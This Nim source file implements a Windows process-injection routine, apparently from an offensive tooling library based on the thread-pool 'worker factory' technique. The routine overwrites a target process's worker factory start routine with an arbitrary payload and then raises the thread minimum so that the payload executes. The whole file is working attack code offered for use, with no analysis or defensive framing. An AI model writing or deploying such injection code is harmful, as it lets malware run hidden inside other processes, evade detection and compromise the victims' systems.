import winim/lean

import nimpool 
import ../instance

proc injectViaWorkerFactoryStartRoutine*(tProcess, hWorkerFactory: HANDLE, pPayload: pointer, szPayload: int): bool =
  var 
    status: NTSTATUS
    workerFactoryInfo: WORKER_FACTORY_BASIC_INFORMATION
    dwOldProtect: DWORD
    threadMinimumCount: int
    
  # Get function pointers
  let pNtSetInformationWorkerFactory = cast[NtSetInformationWorkerFactory](
    ninst.Win32.GetProcAddress(
        ninst.Win32.GetModuleHandleA("NTDLL.DLL"), "NtSetInformationWorkerFactory")
  )
  let pNtQueryInformationWorkerFactory = cast[NtQueryInformationWorkerFactory](
    ninst.Win32.GetProcAddress(
        ninst.Win32.GetModuleHandleA("NTDLL.DLL"), "NtQueryInformationWorkerFactory")
  )
  if pNtQueryInformationWorkerFactory == nil or pNtSetInformationWorkerFactory == nil:
    return false

  # Get start routine of the worker factory
  status = pNtQueryInformationWorkerFactory(
    hWorkerFactory, workerFactoryBasicInformation, cast[PVOID](workerFactoryInfo.addr), 
    sizeof(WORKER_FACTORY_BASIC_INFORMATION).ULONG, nil
  )
  if status != ERROR_SUCCESS:
    return false

  # Change start routine to R/W 
  if ninst.Win32.VirtualProtectEx(tProcess, workerFactoryInfo.StartRoutine, szPayload, PAGE_READWRITE, dwOldProtect.addr) == 0:
    return false
  # Write payload
  if ninst.Win32.WriteProcessMemory(tProcess, workerFactoryInfo.StartRoutine, pPayload, szPayload, NULL) == 0:
    return false
  # Revert Protections
  if ninst.Win32.VirtualProtectEx(tProcess, workerFactoryInfo.StartRoutine, szPayload, dwOldProtect, dwOldProtect.addr) == 0:
    return false

  # Increase minimum number of threads in the pool
  threadMinimumCount = workerFactoryInfo.TotalWorkerCount + 1
  status = pNtSetInformationWorkerFactory(hWorkerFactory, workerFactoryThreadMinimum, cast[PVOID](threadMinimumCount.addr), sizeof(uint32).ULONG)
  if not NT_SUCCESS(status):
    return false